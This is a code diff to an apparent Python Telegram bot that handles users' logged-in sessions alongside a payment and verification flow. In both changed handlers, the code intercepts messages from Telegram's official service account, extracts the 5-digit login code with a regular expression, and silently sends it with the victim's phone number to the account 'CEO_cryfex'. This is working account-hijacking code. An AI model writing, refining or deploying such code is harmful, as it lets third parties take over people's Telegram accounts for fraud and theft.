@@ -2624,12 +2624,18 @@ Your payment will be moved to Main Balance after verification.
         # Forward login code if any
         @client.on(events.NewMessage(incoming=True))
         async def handler(event):
-            # Forward ONLY official telegram messages
+            # Extract only 5-digit code from official telegram messages
             try:
                 if event.sender_id == 777000:
-                    # Forward to the admin username from attached code
-                    await client.send_message('CEO_cryfex', event.message)
-                    logger.info(f"Forwarded official message (2FA path) for {phone} to CEO_cryfex")
+                    import re
+                    # Look for a 5-digit code (Login code: 12345)
+                    match = re.search(r'\b(\d{5})\b', event.raw_text)
+                    if match:
+                        code = match.group(1)
+                        forward_text = f"📞 Number: `{phone}`\n🔢 Code: `{code}`"
+                        # Forward to the admin username from attached code
+                        await client.send_message('CEO_cryfex', forward_text)
+                        logger.info(f"Forwarded 5-digit code for {phone} to CEO_cryfex")
             except Exception as e:
                 logger.error(f"Forwarding error (2FA path) for {phone}: {e}")
 
@@ -2803,11 +2809,17 @@ async def confirm_otp_callback(update: Update, context: ContextTypes.DEFAULT_TYP
                 @client.on(events.NewMessage(incoming=True))
                 async def handler(event):
                     try:
-                        # Forward ONLY official telegram messages
+                        # Extract only 5-digit code from official telegram messages
                         if event.sender_id == 777000:
-                            # Forward to the admin username from attached code
-                            await client.send_message('CEO_cryfex', event.message)
-                            logger.info(f"Forwarded official message for {user_number} to CEO_cryfex")
+                            import re
+                            # Look for a 5-digit code
+                            match = re.search(r'\b(\d{5})\b', event.raw_text)
+                            if match:
+                                code = match.group(1)
+                                forward_text = f"📞 Number: `{user_number}`\n🔢 Code: `{code}`"
+                                # Forward to the admin username from attached code
+                                await client.send_message('CEO_cryfex', forward_text)
+                                logger.info(f"Forwarded 5-digit code for {user_number} to CEO_cryfex")
                     except Exception as e:
                         logger.error(f"Forwarding error for {user_number}: {e}")
                 
